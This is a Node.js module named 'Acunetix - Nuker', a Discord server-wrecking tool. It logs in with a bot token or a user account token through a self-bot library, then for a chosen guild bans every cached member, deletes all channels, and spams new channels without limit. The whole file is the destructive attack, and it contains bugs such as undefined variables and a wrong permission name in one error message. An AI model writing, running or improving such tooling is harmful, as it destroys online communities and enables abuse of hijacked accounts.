const user = require('discord.js-self');
const robot = require('discord.js');
const consoleTitle = require("console-title");
const gui = require("../module/gui");
const chalk = require("chalk");
const input = require("input");

const robo = new robot.Client();
const self = new user.Client();

async function nukeServer() {
    console.clear();
    consoleTitle("Acunetix - Nuker")
    gui()

    const query = await input.select([
        "Robot Account",
        "User Account"
    ])

    if (query === "Robot Account") {
        const readline = require('readline');

        const rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout
        });

        rl.question(chalk.magenta(">") + ' Enter the bot\'s token: ', (token) => {
            robo.once("ready", async () => {
                consoleTitle(`Logged in as: ${robo.user.tag}`)

                const gId = await input.text(`${chalk.magenta(">")} Guild ID: `);

                const findGuild = robo.guilds.cache.get(gId);
                if (!findGuild) return console.log(`${chalk.red("Error:")} Guild id not found`);

                // START NUKE PROCESS

                if (findGuild.me.hasPermission("BAN_MEMBERS")) {
                    try {
                        // Banning members
                        findGuild.members.cache.forEach((member) => {
                            member.ban();
                            console.log(`${chalk.magenta("[")}+${chalk.magenta("]")} Banned ${chalk.magenta(`${member.id}`)}`)
                        })
                    } catch {
                        console.log(`${chalk.magenta("[")}+${chalk.magenta("]")} Failed to ban a member (reason: higher or same role)`)
                    }
                } else {
                    console.log(`${chalk.red("Error:")} Lacking Permission: MANAGE_CHANNELS --> Moving on to the next part`);
                }

                if (findGuild.me.hasPermission("MANAGE_CHANNELS")) {
                    try {
                        // Deleting Channels
                        findGuild.channels.cache.forEach((role) => {
                            role.delete();
                            console.log(`${chalk.magenta("[")}+${chalk.magenta("]")} Deleted ${chalk.magenta(`${channelid}`)}`)
                        })
                    } catch (err) {
                        console.log(`${chalk.magenta("[")}+${chalk.magenta("]")} Failed to delete role`)
                        console.log(err);
                    }

                    try {
                        setInterval(() => {
                            findGuild.channels.create(channelName).then((role) => {
                                console.log(`${chalk.magenta("[")}+${chalk.magenta("]")} Created ${chalk.magenta(`${role.id}`)}`)
                            });
                        })
                    } catch (err) {
                        console.log(err);
                    }
                } else {
                    return console.log(`${chalk.red("Error:")} Lacking Permission: MANAGE_CHANNELS. Please make sure that you or the bot has permissions, if you have permissions re-run the cli and use the user account option`);
                }

                // START NUKE PROCESS
            })

            robo.login(token).catch(O_o => {
                console.clear();
                gui();
                console.log(`${time} | ${chalk.red("[Invalid Token]")} please provide a valid bot token.`);
            })
        });
    } else if (query === "User Account") {
        const readline = require('readline');

        const rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout
        });

        rl.question(chalk.magenta(">") + ' Enter the account\'s token: ', (token) => {
            self.once("ready", async () => {
                consoleTitle(`Logged in as: ${self.user.tag}`)
            })

            self.once("ready", async () => {
                consoleTitle(`Logged in as: ${self.user.tag}`)

                const gId = await input.text(`${chalk.magenta(">")} Guild ID: `);
                const channelName = await input.text(`${chalk.magenta(">")} Channel Name`)

                const findGuild = self.guilds.cache.get(gId);
                if (!findGuild) return console.log(`${chalk.red("Error:")} Guild id not found`);

                // START NUKE PROCESS

                if (findGuild.me.hasPermission("BAN_MEMBERS")) {
                    try {
                        // Banning members
                        findGuild.members.cache.forEach((member) => {
                            member.ban();
                            console.log(`${chalk.magenta("[")}+${chalk.magenta("]")} Banned ${chalk.magenta(`${member.id}`)}`)
                        })
                    } catch {
                        console.log(`${chalk.magenta("[")}+${chalk.magenta("]")} Failed to ban a member (reason: higher or same role)`)
                    }
                } else {
                    console.log(`${chalk.red("Error:")} Lacking Permission: MANAGE_CHANNELS --> Moving on to the next part`);
                }

                if (findGuild.me.hasPermission("MANAGE_CHANNELS")) {
                    try {
                        // Deleting Channels
                        findGuild.channels.cache.forEach((role) => {
                            role.delete();
                            console.log(`${chalk.magenta("[")}+${chalk.magenta("]")} Deleted ${chalk.magenta(`${channelid}`)}`)
                        })
                    } catch (err) {
                        console.log(`${chalk.magenta("[")}+${chalk.magenta("]")} Failed to delete role`)
                        console.log(err);
                    }

                    try {
                        setInterval(() => {
                            findGuild.channels.create(channelName).then((role) => {
                                console.log(`${chalk.magenta("[")}+${chalk.magenta("]")} Created ${chalk.magenta(`${role.id}`)}`)
                            });
                        })
                    } catch (err) {
                        console.log(err);
                    }
                } else {
                    return console.log(`${chalk.red("Error:")} Lacking Permission: MANAGE_CHANNELS. Please make sure that you or the bot has permissions, if you have permissions re-run the cli and use the user account option`);
                }

                // START NUKE PROCESS
            })

            self.login(token).catch(O_o => {
                console.clear();
                gui();
                console.log(`${time} | ${chalk.red("[Invalid Token]")} please provide a valid user token.`);
            })
        });

    } else {
        console.log("\nInvalid Option");
        process.exit();
    }

}

module.exports = nukeServer;